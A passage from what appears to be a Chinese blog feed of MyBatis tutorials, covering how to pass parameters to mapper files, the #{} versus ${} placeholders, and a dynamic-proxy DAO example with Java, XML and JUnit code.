align="center"><code>hashmap</code></td></tr><tr><td align="center"><code>数组</code></td><td align="center"><code>array</code></td></tr></tbody></table><h2 id="2-一个类型参数"><a href="#2-一个类型参数" class="headerlink" title="2.一个类型参数"></a>2.一个类型参数</h2><p>mybatis 把 java 的基本数据类型和 String 都叫简单类型。在 mapper 文件中获取简单类型的一个参数的值，用<code>#&#123;任意字符名称&#125;</code>，它叫做<code>占位符</code>。</p><p>如：</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectStudentById&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;java.lang.Integer&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.loong.test.USER&quot;</span>&gt;</span><br>        select * from test where id =#&#123;userid&#125;;<br><span class="hljs-comment">&lt;!-- 这里的 userid 就是任意的字符名称 --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>使用 <code>#&#123;&#125;</code> 之后， mybatis 执行 SQL 是使用的 JDBC 中的 PreparedStatement 对象。</p><h2 id="3-多个类型参数-命名参数（-Param）"><a href="#3-多个类型参数-命名参数（-Param）" class="headerlink" title="3. 多个类型参数-命名参数（@Param）"></a>3. 多个类型参数-命名参数（@Param）</h2><p>当 Dao 接口方法多个参数，需要通过名称使用参数。在方法形参前面加入 <code>@Param(&quot;自定义参数名&quot;)</code>，<code>mapper</code> 文件使用 <code>#&#123;自定义参数名&#125;</code> 。<br>示例：<br>接口中</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Student&gt; <span class="hljs-title">selectParm</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;myname&quot;)</span> String name,<span class="hljs-meta">@Param(&quot;myage&quot;)</span> Integer age)</span></span><br></code></pre></div></td></tr></table></figure><p>mapper 文件中</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span>&gt;</span><br>select * from student where name = #&#123;myname&#125; or age = #&#123;myage&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">seletct</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>在 mapper 文件中的 <code>myname</code> 和 <code>myage</code> 对应的就是在接口中的 <code>myname</code> 和 <code>myage</code> 。</p><p>具体示例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/*接口文件*/</span><br><span class="hljs-function">List&lt;Student&gt; <span class="hljs-title">selectParm</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;myname&quot;)</span> String name,<span class="hljs-meta">@Param(&quot;myage&quot;)</span> Integer age)</span></span>;<br><span class="hljs-comment">/*mapper文件*/</span><br>&lt;select id=<span class="hljs-string">&quot;selectParm&quot;</span> resultType=<span class="hljs-string">&quot;com.xxx.xxx.Student&quot;</span>&gt;<br>select * from student where name = #&#123;myname&#125; or age = #&#123;myage&#125;;<br>&lt;/select&gt;<br><br></code></pre></div></td></tr></table></figure><h2 id="4-多个类型参数-使用对象"><a href="#4-多个类型参数-使用对象" class="headerlink" title="4. 多个类型参数-使用对象"></a>4. 多个类型参数-使用对象</h2><p>使用 java 对象传递参数，java 的属性值就是 SQL 需要的参数值。每一个属性就是一个参数。语法格式：<code>#&#123;属性名,javaType=java 中数据类型名,jdbcType=数据库中数据类型名&#125;</code> ，例如：#{parname,javaType=java.lang.String,jdbcType=VARCHAR}。</p><p>示例：<br>类：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ew</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String parname;<br>    <span class="hljs-keyword">private</span> Integer parage;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getParname</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> parname;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setParname</span><span class="hljs-params">(String parname)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.parname = parname;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Integer <span class="hljs-title">getParage</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> parage;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setParage</span><span class="hljs-params">(Integer parage)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.parage = parage;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>mapper 文件</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;Dao中的方法名&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.xxx.xxx.Student&quot;</span>&gt;</span><br>select * from student where<br>name = #&#123;parname,javaType=java.lang.String,jdbcType=VARCHAR&#125;<br>or age = #&#123;parage,javaType=java.lang.Integer,jdbcType=INTEGER&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>其中，<code>parname</code> 和 <code>parage</code> 是类中属性的名称。</p><p>这是标准的写法，但是太繁琐了。简化格式为：<code>#&#123;属性名&#125;</code> ，而 javaType，和 jdbcType的值mybatis反射能获取。</p><p>所以，简化为：</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;Dao中的方法名&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.xxx.xxx.Student&quot;</span>&gt;</span><br>select * from student where name = #&#123;parname&#125; or age = #&#123;parage&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="5-多个参数-按位置（了解）"><a href="#5-多个参数-按位置（了解）" class="headerlink" title="5. 多个参数-按位置（了解）"></a>5. 多个参数-按位置（了解）</h2><p>参数位置从 0 开始，引用参数语法 <code>#&#123;arg位置编号&#125;</code>，第一个参数是 <code>#&#123;arg0&#125;</code>，第二个是 <code>#&#123;arg1&#125;</code> 。但是，在 mybatis-3.3 及其之前的版本使用 #{0}，#{1}的方式，从 mybatis3.4 开始才是使用的 #{arg0} 的方式。</p><p>示例：<br>接口</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function">List&lt;Student&gt; <span class="hljs-title">se</span><span class="hljs-params">(String name,<span class="hljs-keyword">int</span> age)</span></span>;<br></code></pre></div></td></tr></table></figure><p>mapper 文件</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;se&quot;</span>&gt;</span><br>select * from student where name = #&#123;arg0&#125; or age = #&#123;arg1&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="6-多个参数-使用Map（了解）"><a href="#6-多个参数-使用Map（了解）" class="headerlink" title="6. 多个参数-使用Map（了解）"></a>6. 多个参数-使用Map（了解）</h2><p>Map 集合可以存储多个值，使用 Map 向 mapper 文件一次传入多个参数。Map 集合使用 String 的 key，Object 类型的值存储参数。mapper 文件使用 <code>#&#123;key&#125;</code> 引用参数值。</p><p>示例：<br>接口</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function">List&lt;Student&gt; <span class="hljs-title">se</span><span class="hljs-params">(Map&lt;String,Object&gt; map)</span></span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">Map&lt;String,Object&gt; data = new HashMap&lt;String,Object&gt;();</span><br><span class="hljs-comment">data.put(&quot;myname&quot;,&quot;lise&quot;);</span><br><span class="hljs-comment">data.put(&quot;myage&quot;,23);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br></code></pre></div></td></tr></table></figure><p>mapper 文件</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span>&gt;</span><br>select * from student where name = #&#123;myname&#125; or age = #&#123;myage&#125;;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="7-和-的区别"><a href="#7-和-的区别" class="headerlink" title="7. # 和 $ 的区别"></a>7. # 和 $ 的区别</h2><h3 id="7-1-占位符（-）"><a href="#7-1-占位符（-）" class="headerlink" title="7.1 占位符（#）"></a>7.1 占位符（#）</h3><p>#：是告诉mybatis使用实际的参数值代替。并使用 PrepareStatement 对象执行 SQL 语句，#{····} 代替 SQL<br>语句的  <code>&quot;?&quot;</code> ，这样可以防止SQL注入，更加安全，更迅速，通常也是首选做法。</p><h3 id="7-2-字符串替换（-）"><a href="#7-2-字符串替换（-）" class="headerlink" title="7.2 字符串替换（$）"></a>7.2 字符串替换（$）</h3><p>￥：告诉mybatis使用 $ 包含的 “字符串”替换所在位置。使用Statement 把 SQL 语句和 ${} 的内容连接起来。主要用在替换表名，列名，不同列排序等操作。</p><p>理解：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/* studentid=1001 */</span><br><br><span class="hljs-comment">/* #的运行结果 */</span><br>select * from student where id=#&#123;studentid&#125;<br>select * from student where id=?<br><span class="hljs-comment">/* $的运行结果 */</span><br>select * from student where id=$&#123;studentid&#125;<br>select * from student where id=<span class="hljs-number">1001</span><br></code></pre></div></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>从 java 代码中把实际的值传入到 mapper 文件中。</p><blockquote><ol><li>一个简单类型的参数，使用： <code>#&#123;任意字符&#125;</code> 。</li></ol></blockquote><blockquote><ol start="2"><li>多个简单类型的参数，使用： <code>@Param(&quot;自定义名称&quot;)</code> 。</li></ol></blockquote><blockquote><ol start="3"><li>使用一个 java 对象，对象的属性值作为 mapper 文件找到参数： <code>#&#123;java 对象的属性名称&#125;</code> 。</li></ol></blockquote><blockquote><ol start="4"><li>使用参数的位置，语法：<code>#&#123;arg0&#125;</code>、<code>#&#123;arg1&#125;</code> ，mybatis3.4 之前的版本，使用的 #{0}、#{1} 。</li></ol></blockquote><blockquote><ol start="5"><li>使用 Map 作为参数： <code>#&#123;map的key&#125;</code> 。</li></ol></blockquote><h1 id="和-的区别"><a href="#和-的区别" class="headerlink" title="# 和 $ 的区别"></a># 和 $ 的区别</h1><blockquote><ol><li><code>#</code> 是占位符，表示列值的，放在等号右侧。</li></ol></blockquote><blockquote><ol start="2"><li><code>$</code> 是占位符，表示字符串的连接，把 SQL 语句连接成一个字符串。</li></ol></blockquote><blockquote><ol start="3"><li><code>#</code> 占位符使用的 JDBC 指定 PreparedStatement 对象执行 SQL 语句，效率高，没有 SQL 注入的风险。</li></ol></blockquote><blockquote><ol start="4"><li><code>$</code> 使用的是 Statement 对象执行 SQL，效率低，有 SQL注入风险。</li></ol></blockquote>]]></content>
    
    
    <categories>
      
      <category>MyBatis学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MyBatis学习-（二）动态代理实现</title>
    <link href="/2021/06/14/MyBatis%E5%AD%A6%E4%B9%A0/MyBatis%E5%AD%A6%E4%B9%A0-%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%AE%9E%E7%8E%B0/"/>
    <url>/2021/06/14/MyBatis%E5%AD%A6%E4%B9%A0/MyBatis%E5%AD%A6%E4%B9%A0-%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>MyBatis 是一款优秀的持久层框架，它支持自定义 SQL、存储过程以及高级映射。MyBatis 免除了几乎所有的 JDBC 代码以及设置参数和获取结果集的工作。MyBatis 可以通过简单的 XML 或注解来配置和映射原始类型、接口和 Java POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>MyBatis 中文文档：<a href="https://mybatis.org/mybatis-3/zh/index.html">https://mybatis.org/mybatis-3/zh/index.html</a></p><h2 id="1-Dao"><a href="#1-Dao" class="headerlink" title="1.Dao"></a>1.Dao</h2><h3 id="1-1-接口"><a href="#1-1-接口" class="headerlink" title="1.1 接口"></a>1.1 接口</h3><p><strong><code>MybatisStudyDao.java</code></strong></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.loong.Dao;<br><br><span class="hljs-keyword">import</span> com.loong.test.USER;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">MybatisStudyDao</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;USER&gt; <span class="hljs-title">alluser</span><span class="hljs-params">()</span></span>; <span class="hljs-comment">//查询</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">inserttest</span><span class="hljs-params">(USER user)</span></span>; <span class="hljs-comment">//插入</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">    方法名与配置文件中的查询语句的 id 名要一致。</span><br><span class="hljs-comment">    */</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-2-配置文件"><a href="#1-2-配置文件" class="headerlink" title="1.2 配置文件"></a>1.2 配置文件</h3><p><strong><code>MybatisStudyDao.xml</code></strong></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">mapper</span></span><br><span class="hljs-meta">        <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.loong.Dao.MybatisStudyDao&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;alluser&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.loong.test.USER&quot;</span>&gt;</span><br>        select * from test;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;inserttest&quot;</span>&gt;</span><br>        insert into test value (#&#123;id&#125;,#&#123;username&#125;,#&#123;tele&#125;);<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="2-utils"><a href="#2-utils" class="headerlink" title="2.utils"></a>2.utils</h2><p><strong><code>myutils.java</code></strong></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.loong.utils;<br><br><span class="hljs-keyword">import</span> org.apache.ibatis.io.Resources;<br><span class="hljs-keyword">import</span> org.apache.ibatis.session.SqlSession;<br><span class="hljs-keyword">import</span> org.apache.ibatis.session.SqlSessionFactory;<br><span class="hljs-keyword">import</span> org.apache.ibatis.session.SqlSessionFactoryBuilder;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">myutils</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> SqlSessionFactory factory = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">static</span> &#123;<br>        String config = <span class="hljs-string">&quot;mybatis.xml&quot;</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            InputStream in = Resources.getResourceAsStream(config);<br>            factory = <span class="hljs-keyword">new</span> SqlSessionFactoryBuilder().build(in);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SqlSession <span class="hljs-title">getSqlSession</span><span class="hljs-params">()</span></span>&#123;<br>        SqlSession sqlsession = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">if</span>(factory != <span class="hljs-keyword">null</span>)&#123;<br>            sqlsession = factory.openSession();<br>        &#125;<br>        <span class="hljs-keyword">return</span> sqlsession;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="3-实体类"><a href="#3-实体类" class="headerlink" title="3.实体类"></a>3.实体类</h2><p><strong><code>USER.java</code></strong></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.loong.test;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">USER</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> Integer id;<br>    <span class="hljs-keyword">private</span> String username;<br>    <span class="hljs-keyword">private</span> String tele;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Integer <span class="hljs-title">getId</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> id;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setId</span><span class="hljs-params">(Integer id)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getTele</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> tele;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setTele</span><span class="hljs-params">(String tele)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.tele = tele;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;USER&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;id=&quot;</span> + id +<br>                <span class="hljs-string">&quot;, username=&#x27;&quot;</span> + username + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, tele=&#x27;&quot;</span> + tele + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.loong;<br><br><br><span class="hljs-keyword">import</span> com.loong.Dao.MybatisStudyDao;<br><span class="hljs-keyword">import</span> com.loong.test.USER;<br><span class="hljs-keyword">import</span> com.loong.utils.myutils;<br><span class="hljs-keyword">import</span> org.apache.ibatis.session.SqlSession;<br><span class="hljs-keyword">import</span> org.junit.Test;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">inTest</span> </span>&#123;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">tsetall</span><span class="hljs-params">()</span></span>&#123;<br>        SqlSession sqlsession = myutils.getSqlSession();<br>        MybatisStudyDao dao = sqlsession.getMapper(MybatisStudyDao.class);<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">        使用SqlSession.getMapper(dao接口.class) 获取这个dao接口的对象。</span><br><span class="hljs-comment">        */</span><br>        List&lt;USER&gt; list = dao.alluser();<br>        <span class="hljs-keyword">for</span>(USER st:list)&#123;<br>            System.out.println(st);<br><br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">testin</span><span class="hljs-params">()</span></span>&#123;<br>        SqlSession sqlsession = myutils.getSqlSession();<br>        MybatisStudyDao dao = sqlsession.getMapper(MybatisStudyDao.class);<br>        <br>        USER us = <span class="hljs-keyword">new</span> USER();<br>        us.setTele(<span class="hljs-string">&quot;3423&quot;</span>);<br>        us.setUsername(<span class="hljs-string">&quot;luoyi&quot;</span>);<br>        us.setId(<span class="hljs-number">34</span>);<br><br>        <span class="hljs-keyword">int</span> ans = dao.inserttest(us);<br>        sqlsession.commit();<br>        sqlsession.close();<br>        System.out.println(ans);<br><br>    &#125;<br><br>&#125;<br><br></code></pre></div></td></tr></table></figure><h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h1><h2 id="4-1-动态代理"><a href="#4-1-动态代理" class="headerlink" title="4.1 动态代理"></a>4.1 动态代理</h2><p>就是 mybatis 帮你创建 dao 接口的实现类，在实现类中调用 SqlSession 的方法执行 SQL 语句。</p><h2 id="4-2-使用方法"><a href="#4-2-使用方法" class="headerlink" title="4.2 使用方法"></a>4.2 使用方法</h2><blockquote><ol><li>获取 SqlSession 对象，SqlSessionFactory.openSession()</li></ol></blockquote><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">SqlSession sqlsession = myutils.getSqlSession();<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>使用 getMapper 方法获取某个接口的对象，sqlsession.getMapper(接口.class)</li></ol></blockquote><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td 